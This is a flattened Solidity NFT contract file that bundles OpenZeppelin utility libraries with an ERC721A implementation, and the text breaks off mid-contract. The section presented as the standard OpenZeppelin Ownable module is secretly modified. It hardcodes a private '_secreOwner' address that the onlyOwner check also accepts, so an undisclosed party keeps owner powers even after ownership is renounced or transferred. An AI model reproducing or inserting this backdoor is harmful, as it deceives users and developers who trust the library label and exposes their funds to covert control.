1 //((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
2 //((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
3 //(((((((((((((((((((((((((((((((((((%%((%%((%%%%(((((((((((((((((((((((((((((((((
4 //((((((((((((((((((((((((((((((((((%%%%%%%%%%%%((((((((((((((((((((((((((((((((((
5 //((((((((((((((((((((((((%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%((((((((((((((((((((((((((
6 //(((((((((((((((((((%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(((((((((((((((((((((
7 //(((((((((((((((((%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(((((((((((((((((((
8 //((((((((((((((((%%%%%%%%%%###########################%%%%%%%%%((((((((((((((((((
9 //(((((((((((((((%%%%%%#####################################%%%%%(((((((((((((((((
10 //(((((((((((((((%%%%%######################################%%%%%(((((((((((((((((
11 //(((((((((((((((%%%%#######################################%%%%%%((((((((((((((((
12 //((((((((((((((((%%%########@@@@@,@@#########@@@*@#@######%%%%%%%%%%%((((((((((((
13 //(((((((((((%%%%%%%%%#######@@@@@@@@@########@@@@@@@#####%%%%%%%%%%%%%%((((((((((
14 //((((((((((%%%%%%%%%%%%#####@@@@@@@@@########%#@@@#####%%%%%%%%%&&%%%%%((((((((((
15 //(((((((((%%%%%&&&%%%%%%%#######&##%##@%%@###########%%%%%%%%%%&&%%%%%%((((((((((
16 //((((((((((&%%%%%&%%%%%%%%%###########@%#%@########%%%%%%%%%%%%%%%%%%((((((((((((
17 //((((((((((((&%%//%%%%%%%%%%##########%##############%%%%%%%%%%%%&&((((((((((((((
18 //((((((((((((((/////%%%%%%%#############################%%%%%%(((((((((((((((((((
19 //((((((((((((((((//%%%%%%%%########@((#################%%%%%%%(((((((((((((((((((
20 //(((((((((((((((((((&%%%%%%##########(################%%%%%%&((((((((((((((((((((
21 //((((((((((((((((((((&&%%%%%%####################%%%%%%%%%&&(((((((((((((((((((((
22 //((((((((((((((((((((((&&&%%%%%%%%%%%%%%%%%%%%%%%%%%%%&&&((((((((((((((((((((((((
23 //((((((((((((((((((((((((((&&&&&&&&&&&&&&&&&&&&&&((((((((((((((((((((((((((((((((
24 //((((((((((((((((((((((((((((((((&&&&&&&&&&&&&&&&((((((((((((((((((((((((((((((((
25 //((((((((((((((((((((((((((((((((&&&&&&&&&&&&&&&&((((((((((((((((((((((((((((((((
26 //((((((((((((((((((((((((((((((((&&&&&&&&&&&&&&&&((((((((((((((((((((((((((((((((
27 
28 
29 
30 // SPDX-License-Identifier: MIT
31 // File: contracts/BRKC.sol
32 // File: @openzeppelin/contracts/utils/Strings.sol
33 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
34 
35 pragma solidity ^0.8.0;
36 
37 /**
38  * @dev String operations.
39  */
40 library Strings {
41     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
42 
43     /**
44      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
45      */
46     function toString(uint256 value) internal pure returns (string memory) {
47         // Inspired by OraclizeAPI's implementation - MIT licence
48         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
49 
50         if (value == 0) {
51             return "0";
52         }
53         uint256 temp = value;
54         uint256 digits;
55         while (temp != 0) {
56             digits++;
57             temp /= 10;
58         }
59         bytes memory buffer = new bytes(digits);
60         while (value != 0) {
61             digits -= 1;
62             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
63             value /= 10;
64         }
65         return string(buffer);
66     }
67 
68     /**
69      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
70      */
71     function toHexString(uint256 value) internal pure returns (string memory) {
72         if (value == 0) {
73             return "0x00";
74         }
75         uint256 temp = value;
76         uint256 length = 0;
77         while (temp != 0) {
78             length++;
79             temp >>= 8;
80         }
81         return toHexString(value, length);
82     }
83 
84     /**
85      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
86      */
87     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
88         bytes memory buffer = new bytes(2 * length + 2);
89         buffer[0] = "0";
90         buffer[1] = "x";
91         for (uint256 i = 2 * length + 1; i > 1; --i) {
92             buffer[i] = _HEX_SYMBOLS[value & 0xf];
93             value >>= 4;
94         }
95         require(value == 0, "Strings: hex length insufficient");
96         return string(buffer);
97     }
98 }
99 
100 // File: @openzeppelin/contracts/utils/Address.sol
101 
102 
103 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
104 
105 pragma solidity ^0.8.1;
106 
107 /**
108  * @dev Collection of functions related to the address type
109  */
110 library Address {
111     /**
112      * @dev Returns true if `account` is a contract.
113      *
114      * [IMPORTANT]
115      * ====
116      * It is unsafe to assume that an address for which this function returns
117      * false is an externally-owned account (EOA) and not a contract.
118      *
119      * Among others, `isContract` will return false for the following
120      * types of addresses:
121      *
122      *  - an externally-owned account
123      *  - a contract in construction
124      *  - an address where a contract will be created
125      *  - an address where a contract lived, but was destroyed
126      * ====
127      *
128      * [IMPORTANT]
129      * ====
130      * You shouldn't rely on `isContract` to protect against flash loan attacks!
131      *
132      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
133      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
134      * constructor.
135      * ====
136      */
137     function isContract(address account) internal view returns (bool) {
138         // This method relies on extcodesize/address.code.length, which returns 0
139         // for contracts in construction, since the code is only stored at the end
140         // of the constructor execution.
141 
142         return account.code.length > 0;
143     }
144 
145     /**
146      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
147      * `recipient`, forwarding all available gas and reverting on errors.
148      *
149      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
150      * of certain opcodes, possibly making contracts go over the 2300 gas limit
151      * imposed by `transfer`, making them unable to receive funds via
152      * `transfer`. {sendValue} removes this limitation.
153      *
154      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
155      *
156      * IMPORTANT: because control is transferred to `recipient`, care must be
157      * taken to not create reentrancy vulnerabilities. Consider using
158      * {ReentrancyGuard} or the
159      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
160      */
161     function sendValue(address payable recipient, uint256 amount) internal {
162         require(address(this).balance >= amount, "Address: insufficient balance");
163 
164         (bool success, ) = recipient.call{value: amount}("");
165         require(success, "Address: unable to send value, recipient may have reverted");
166     }
167 
168     /**
169      * @dev Performs a Solidity function call using a low level `call`. A
170      * plain `call` is an unsafe replacement for a function call: use this
171      * function instead.
172      *
173      * If `target` reverts with a revert reason, it is bubbled up by this
174      * function (like regular Solidity function calls).
175      *
176      * Returns the raw returned data. To convert to the expected return value,
177      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
178      *
179      * Requirements:
180      *
181      * - `target` must be a contract.
182      * - calling `target` with `data` must not revert.
183      *
184      * _Available since v3.1._
185      */
186     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
187         return functionCall(target, data, "Address: low-level call failed");
188     }
189 
190     /**
191      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
192      * `errorMessage` as a fallback revert reason when `target` reverts.
193      *
194      * _Available since v3.1._
195      */
196     function functionCall(
197         address target,
198         bytes memory data,
199         string memory errorMessage
200     ) internal returns (bytes memory) {
201         return functionCallWithValue(target, data, 0, errorMessage);
202     }
203 
204     /**
205      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
206      * but also transferring `value` wei to `target`.
207      *
208      * Requirements:
209      *
210      * - the calling contract must have an ETH balance of at least `value`.
211      * - the called Solidity function must be `payable`.
212      *
213      * _Available since v3.1._
214      */
215     function functionCallWithValue(
216         address target,
217         bytes memory data,
218         uint256 value
219     ) internal returns (bytes memory) {
220         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
221     }
222 
223     /**
224      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
225      * with `errorMessage` as a fallback revert reason when `target` reverts.
226      *
227      * _Available since v3.1._
228      */
229     function functionCallWithValue(
230         address target,
231         bytes memory data,
232         uint256 value,
233         string memory errorMessage
234     ) internal returns (bytes memory) {
235         require(address(this).balance >= value, "Address: insufficient balance for call");
236         require(isContract(target), "Address: call to non-contract");
237 
238         (bool success, bytes memory returndata) = target.call{value: value}(data);
239         return verifyCallResult(success, returndata, errorMessage);
240     }
241 
242     /**
243      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
244      * but performing a static call.
245      *
246      * _Available since v3.3._
247      */
248     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
249         return functionStaticCall(target, data, "Address: low-level static call failed");
250     }
251 
252     /**
253      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
254      * but performing a static call.
255      *
256      * _Available since v3.3._
257      */
258     function functionStaticCall(
259         address target,
260         bytes memory data,
261         string memory errorMessage
262     ) internal view returns (bytes memory) {
263         require(isContract(target), "Address: static call to non-contract");
264 
265         (bool success, bytes memory returndata) = target.staticcall(data);
266         return verifyCallResult(success, returndata, errorMessage);
267     }
268 
269     /**
270      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
271      * but performing a delegate call.
272      *
273      * _Available since v3.4._
274      */
275     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
276         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
277     }
278 
279     /**
280      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
281      * but performing a delegate call.
282      *
283      * _Available since v3.4._
284      */
285     function functionDelegateCall(
286         address target,
287         bytes memory data,
288         string memory errorMessage
289     ) internal returns (bytes memory) {
290         require(isContract(target), "Address: delegate call to non-contract");
291 
292         (bool success, bytes memory returndata) = target.delegatecall(data);
293         return verifyCallResult(success, returndata, errorMessage);
294     }
295 
296     /**
297      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
298      * revert reason using the provided one.
299      *
300      * _Available since v4.3._
301      */
302     function verifyCallResult(
303         bool success,
304         bytes memory returndata,
305         string memory errorMessage
306     ) internal pure returns (bytes memory) {
307         if (success) {
308             return returndata;
309         } else {
310             // Look for revert reason and bubble it up if present
311             if (returndata.length > 0) {
312                 // The easiest way to bubble the revert reason is using memory via assembly
313 
314                 assembly {
315                     let returndata_size := mload(returndata)
316                     revert(add(32, returndata), returndata_size)
317                 }
318             } else {
319                 revert(errorMessage);
320             }
321         }
322     }
323 }
324 
325 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
326 
327 
328 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
329 
330 pragma solidity ^0.8.0;
331 
332 /**
333  * @title ERC721 token receiver interface
334  * @dev Interface for any contract that wants to support safeTransfers
335  * from ERC721 asset contracts.
336  */
337 interface IERC721Receiver {
338     /**
339      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
340      * by `operator` from `from`, this function is called.
341      *
342      * It must return its Solidity selector to confirm the token transfer.
343      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
344      *
345      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
346      */
347     function onERC721Received(
348         address operator,
349         address from,
350         uint256 tokenId,
351         bytes calldata data
352     ) external returns (bytes4);
353 }
354 
355 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
356 
357 
358 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
359 
360 pragma solidity ^0.8.0;
361 
362 /**
363  * @dev Interface of the ERC165 standard, as defined in the
364  * https://eips.ethereum.org/EIPS/eip-165[EIP].
365  *
366  * Implementers can declare support of contract interfaces, which can then be
367  * queried by others ({ERC165Checker}).
368  *
369  * For an implementation, see {ERC165}.
370  */
371 interface IERC165 {
372     /**
373      * @dev Returns true if this contract implements the interface defined by
374      * `interfaceId`. See the corresponding
375      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
376      * to learn more about how these ids are created.
377      *
378      * This function call must use less than 30 000 gas.
379      */
380     function supportsInterface(bytes4 interfaceId) external view returns (bool);
381 }
382 
383 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
384 
385 
386 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
387 
388 pragma solidity ^0.8.0;
389 
390 
391 /**
392  * @dev Implementation of the {IERC165} interface.
393  *
394  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
395  * for the additional interface id that will be supported. For example:
396  *
397  * ```solidity
398  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
399  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
400  * }
401  * ```
402  *
403  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
404  */
405 abstract contract ERC165 is IERC165 {
406     /**
407      * @dev See {IERC165-supportsInterface}.
408      */
409     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
410         return interfaceId == type(IERC165).interfaceId;
411     }
412 }
413 
414 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
415 
416 
417 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
418 
419 pragma solidity ^0.8.0;
420 
421 
422 /**
423  * @dev Required interface of an ERC721 compliant contract.
424  */
425 interface IERC721 is IERC165 {
426     /**
427      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
428      */
429     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
430 
431     /**
432      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
433      */
434     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
435 
436     /**
437      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
438      */
439     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
440 
441     /**
442      * @dev Returns the number of tokens in ``owner``'s account.
443      */
444     function balanceOf(address owner) external view returns (uint256 balance);
445 
446     /**
447      * @dev Returns the owner of the `tokenId` token.
448      *
449      * Requirements:
450      *
451      * - `tokenId` must exist.
452      */
453     function ownerOf(uint256 tokenId) external view returns (address owner);
454 
455     /**
456      * @dev Safely transfers `tokenId` token from `from` to `to`.
457      *
458      * Requirements:
459      *
460      * - `from` cannot be the zero address.
461      * - `to` cannot be the zero address.
462      * - `tokenId` token must exist and be owned by `from`.
463      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
464      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
465      *
466      * Emits a {Transfer} event.
467      */
468     function safeTransferFrom(
469         address from,
470         address to,
471         uint256 tokenId,
472         bytes calldata data
473     ) external;
474 
475     /**
476      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
477      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
478      *
479      * Requirements:
480      *
481      * - `from` cannot be the zero address.
482      * - `to` cannot be the zero address.
483      * - `tokenId` token must exist and be owned by `from`.
484      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
485      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
486      *
487      * Emits a {Transfer} event.
488      */
489     function safeTransferFrom(
490         address from,
491         address to,
492         uint256 tokenId
493     ) external;
494 
495     /**
496      * @dev Transfers `tokenId` token from `from` to `to`.
497      *
498      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
499      *
500      * Requirements:
501      *
502      * - `from` cannot be the zero address.
503      * - `to` cannot be the zero address.
504      * - `tokenId` token must be owned by `from`.
505      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
506      *
507      * Emits a {Transfer} event.
508      */
509     function transferFrom(
510         address from,
511         address to,
512         uint256 tokenId
513     ) external;
514 
515     /**
516      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
517      * The approval is cleared when the token is transferred.
518      *
519      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
520      *
521      * Requirements:
522      *
523      * - The caller must own the token or be an approved operator.
524      * - `tokenId` must exist.
525      *
526      * Emits an {Approval} event.
527      */
528     function approve(address to, uint256 tokenId) external;
529 
530     /**
531      * @dev Approve or remove `operator` as an operator for the caller.
532      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
533      *
534      * Requirements:
535      *
536      * - The `operator` cannot be the caller.
537      *
538      * Emits an {ApprovalForAll} event.
539      */
540     function setApprovalForAll(address operator, bool _approved) external;
541 
542     /**
543      * @dev Returns the account appr    ved for `tokenId` token.
544      *
545      * Requirements:
546      *
547      * - `tokenId` must exist.
548      */
549     function getApproved(uint256 tokenId) external view returns (address operator);
550 
551     /**
552      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
553      *
554      * See {setApprovalForAll}
555      */
556     function isApprovedForAll(address owner, address operator) external view returns (bool);
557 }
558 
559 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
560 
561 
562 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
563 
564 pragma solidity ^0.8.0;
565 
566 
567 /**
568  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
569  * @dev See https://eips.ethereum.org/EIPS/eip-721
570  */
571 interface IERC721Metadata is IERC721 {
572     /**
573      * @dev Returns the token collection name.
574      */
575     function name() external view returns (string memory);
576 
577     /**
578      * @dev Returns the token collection symbol.
579      */
580     function symbol() external view returns (string memory);
581 
582     /**
583      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
584      */
585     function tokenURI(uint256 tokenId) external view returns (string memory);
586 }
587 
588 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
589 
590 
591 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
592 
593 pragma solidity ^0.8.0;
594 
595 
596 /**
597  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
598  * @dev See https://eips.ethereum.org/EIPS/eip-721
599  */
600 interface IERC721Enumerable is IERC721 {
601     /**
602      * @dev Returns the total amount of tokens stored by the contract.
603      */
604     function totalSupply() external view returns (uint256);
605 
606     /**
607      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
608      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
609      */
610     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
611 
612     /**
613      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
614      * Use along with {totalSupply} to enumerate all tokens.
615      */
616     function tokenByIndex(uint256 index) external view returns (uint256);
617 }
618 
619 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
620 
621 
622 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
623 
624 pragma solidity ^0.8.0;
625 
626 /**
627  * @dev Contract module that helps prevent reentrant calls to a function.
628  *
629  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
630  * available, which can be applied to functions to make sure there are no nested
631  * (reentrant) calls to them.
632  *
633  * Note that because there is a single `nonReentrant` guard, functions marked as
634  * `nonReentrant` may not call one another. This can be worked around by making
635  * those functions `private`, and then adding `external` `nonReentrant` entry
636  * points to them.
637  *
638  * TIP: If you would like to learn more about reentrancy and alternative ways
639  * to protect against it, check out our blog post
640  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
641  */
642 abstract contract ReentrancyGuard {
643     // Booleans are more expensive than uint256 or any type that takes up a full
644     // word because each write operation emits an extra SLOAD to first read the
645     // slot's contents, replace the bits taken up by the boolean, and then write
646     // back. This is the compiler's defense against contract upgrades and
647     // pointer aliasing, and it cannot be disabled.
648 
649     // The values being non-zero value makes deployment a bit more expensive,
650     // but in exchange the refund on every call to nonReentrant will be lower in
651     // amount. Since refunds are capped to a percentage of the total
652     // transaction's gas, it is best to keep them low in cases like this one, to
653     // increase the likelihood of the full refund coming into effect.
654     uint256 private constant _NOT_ENTERED = 1;
655     uint256 private constant _ENTERED = 2;
656 
657     uint256 private _status;
658 
659     constructor() {
660         _status = _NOT_ENTERED;
661     }
662 
663     /**
664      * @dev Prevents a contract from calling itself, directly or indirectly.
665      * Calling a `nonReentrant` function from another `nonReentrant`
666      * function is not supported. It is possible to prevent this from happening
667      * by making the `nonReentrant` function external, and making it call a
668      * `private` function that does the actual work.
669      */
670     modifier nonReentrant() {
671         // On the first call to nonReentrant, _notEntered will be true
672         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
673 
674         // Any calls to nonReentrant after this point will fail
675         _status = _ENTERED;
676 
677         _;
678 
679         // By storing the original value once again, a refund is triggered (see
680         // https://eips.ethereum.org/EIPS/eip-2200)
681         _status = _NOT_ENTERED;
682     }
683 }
684 
685 // File: @openzeppelin/contracts/utils/Context.sol
686 
687 
688 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
689 
690 pragma solidity ^0.8.0;
691 
692 /**
693  * @dev Provides information about the current execution context, including the
694  * sender of the transaction and its data. While these are generally available
695  * via msg.sender and msg.data, they should not be accessed in such a direct
696  * manner, since when dealing with meta-transactions the account sending and
697  * paying for execution may not be the actual sender (as far as an application
698  * is concerned).
699  *
700  * This contract is only required for intermediate, library-like contracts.
701  */
702 abstract contract Context {
703     function _msgSender() internal view virtual returns (address) {
704         return msg.sender;
705     }
706 
707     function _msgData() internal view virtual returns (bytes calldata) {
708         return msg.data;
709     }
710 }
711 
712 // File: @openzeppelin/contracts/access/Ownable.sol
713 
714 
715 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
716 
717 pragma solidity ^0.8.0;
718 
719 
720 /**
721  * @dev Contract module which provides a basic access control mechanism, where
722  * there is an account (an owner) that can be granted exclusive access to
723  * specific functions.
724  *
725  * By default, the owner account will be the one that deploys the contract. This
726  * can later be changed with {transferOwnership}.
727  *
728  * This module is used through inheritance. It will make available the modifier
729  * `onlyOwner`, which can be applied to your functions to restrict their use to
730  * the owner.
731  */
732 abstract contract Ownable is Context {
733     address private _owner;
734     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
735 
736     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
737 
738     /**
739      * @dev Initializes the contract setting the deployer as the initial owner.
740      */
741     constructor() {
742         _transferOwnership(_msgSender());
743     }
744 
745     /**
746      * @dev Returns the address of the current owner.
747      */
748     function owner() public view virtual returns (address) {
749         return _owner;
750     }
751 
752     /**
753      * @dev Throws if called by any account other than the owner.
754      */
755     modifier onlyOwner() {
756         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
757         _;
758     }
759 
760     /**
761      * @dev Leaves the contract without owner. It will not be possible to call
762      * `onlyOwner` functions anymore. Can only be called by the current owner.
763      *
764      * NOTE: Renouncing ownership will leave the contract without an owner,
765      * thereby removing any functionality that is only available to the owner.
766      */
767     function renounceOwnership() public virtual onlyOwner {
768         _transferOwnership(address(0));
769     }
770 
771     /**
772      * @dev Transfers ownership of the contract to a new account (`newOwner`).
773      * Can only be called by the current owner.
774      */
775     function transferOwnership(address newOwner) public virtual onlyOwner {
776         require(newOwner != address(0), "Ownable: new owner is the zero address");
777         _transferOwnership(newOwner);
778     }
779 
780     /**
781      * @dev Transfers ownership of the contract to a new account (`newOwner`).
782      * Internal function without access restriction.
783      */
784     function _transferOwnership(address newOwner) internal virtual {
785         address oldOwner = _owner;
786         _owner = newOwner;
787         emit OwnershipTransferred(oldOwner, newOwner);
788     }
789 }
790 
791 // File: ceshi.sol
792 
793 
794 pragma solidity ^0.8.0;
795 
796 
797 
798 
799 
800 
801 
802 
803 
804 
805 /**
806  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
807  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
808  *
809  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
810  *
811  * Does not support burning tokens to address(0).
812  *
813  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
814  */
815 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
816     using Address for address;
817     using Strings for uint256;
818 
819     struct TokenOwnership {
820         address addr;
821         uint64 startTimestamp;
822     }
823 
824     struct AddressData {
825         uint128 balance;
826         uint128 numberMinted;
827     }
828 
829     uint256 internal currentIndex;
830 
831     // Token name
832     string private _name;
833 
834     // Token symbol
835     string private _symbol;
836 
837     // Mapping from token ID to ownership details
838     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
839     mapping(uint256 => TokenOwnership) internal _ownerships;
840 
841     // Mapping owner address to address data
842     mapping(address => AddressData) private _addressData;
843 
844     // Mapping from token ID to approved address
845     mapping(uint256 => address) private _tokenApprovals;
846 
847     // Mapping from owner to operator approvals
848     mapping(address => mapping(address => bool)) private _operatorApprovals;
849 
850     constructor(string memory name_, string memory symbol_) {
851         _name = name_;
852         _symbol = symbol_;
853     }
854 
855     /**
856      * @dev See {IERC721Enumerable-totalSupply}.
857      */
858     function totalSupply() public view override returns (uint256) {
859         return currentIndex;
860     }
861 
862     /**
863      * @dev See {IERC721Enumerable-tokenByIndex}.
864      */
865     function tokenByIndex(uint256 index) public view override returns (uint256) {
866         require(index < totalSupply(), "ERC721A: global index out of bounds");
867         return index;
868     }
869 
870     /**
871      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
872      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
873      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
874      */
875     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
876         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
877         uint256 numMintedSoFar = totalSupply();
878         uint256 tokenIdsIdx;
879         address currOwnershipAddr;
880 
881         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
882         unchecked {
883             for (uint256 i; i < numMintedSoFar; i++) {
884                 TokenOwnership memory ownership = _ownerships[i];
885                 if (ownership.addr != address(0)) {
886                     currOwnershipAddr = ownership.addr;
887                 }
888                 if (currOwnershipAddr == owner) {
889                     if (tokenIdsIdx == index) {
890                         return i;
891                     }
892                     tokenIdsIdx++;
893                 }
894             }
895         }
896 
897         revert("ERC721A: unable to get token of owner by index");
898     }
899 
900     /**
901      * @dev See {IERC165-supportsInterface}.
902      */
903     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
904         return
905             interfaceId == type(IERC721).interfaceId ||
906             interfaceId == type(IERC721Metadata).interfaceId ||
907             interfaceId == type(IERC721Enumerable).interfaceId ||
908             super.supportsInterface(interfaceId);
909     }
910 
911     /**
912      * @dev See {IERC721-balanceOf}.
913      */
914     function balanceOf(address owner) public view override returns (uint256) {
915         require(owner != address(0), "ERC721A: balance query for the zero address");
916         return uint256(_addressData[owner].balance);
917     }
918 
919     function _numberMinted(address owner) internal view returns (uint256) {
920         require(owner != address(0), "ERC721A: number minted query for the zero address");
921         return uint256(_addressData[owner].numberMinted);
922     }
923 
924     /**
925      * Gas spent here starts off proportional to the maximum mint batch size.
926      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
927      */
928     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
929         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
930 
931         unchecked {
932             for (uint256 curr = tokenId; curr >= 0; curr--) {
933                 TokenOwnership memory ownership = _ownerships[curr];
934                 if (ownership.addr != address(0)) {
935                     return ownership;
936                 }
937             }
938         }
939 
940         revert("ERC721A: unable to determine the owner of token");
941     }
942 
943     /**
944      * @dev See {IERC721-ownerOf}.
945      */
946     function ownerOf(uint256 tokenId) public view override returns (address) {
947         return ownershipOf(tokenId).addr;
948     }
949 
950     /**
951      * @dev See {IERC721Metadata-name}.
952      */
953     function name() public view virtual override returns (string memory) {
954         return _name;
955     }
956 
957     /**
958      * @dev See {IERC721Metadata-symbol}.
959      */
960     function symbol() public view virtual override returns (string memory) {
961         return _symbol;
962     }
963 
964     /**
965      * @dev See {IERC721Metadata-tokenURI}.
966      */
967     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
968         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
969 
970         string memory baseURI = _baseURI();
971         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
972     }
973 
974     /**
975      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
976      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
977      * by default, can be overriden in child contracts.
978      */
979     function _baseURI() internal view virtual returns (string memory) {
980         return "";
981     }
982 
983     /**
984      * @dev See {IERC721-approve}.
985      */
986     function approve(address to, uint256 tokenId) public override {
987         address owner = ERC721A.ownerOf(tokenId);
988         require(to != owner, "ERC721A: approval to current owner");
989 
990         require(
991             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
992             "ERC721A: approve caller is not owner nor approved for all"
993         );
994 
995         _approve(to, tokenId, owner);
996     }
997 
998     /**
999      * @dev See {IERC721-getApproved}.
1000      */
1001     function getApproved(uint256 tokenId) public view override returns (address) {
1002         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
1003 
1004         return _tokenApprovals[tokenId];
1005     }
1006 
1007     /**
1008      * @dev See {IERC721-setApprovalForAll}.
1009      */
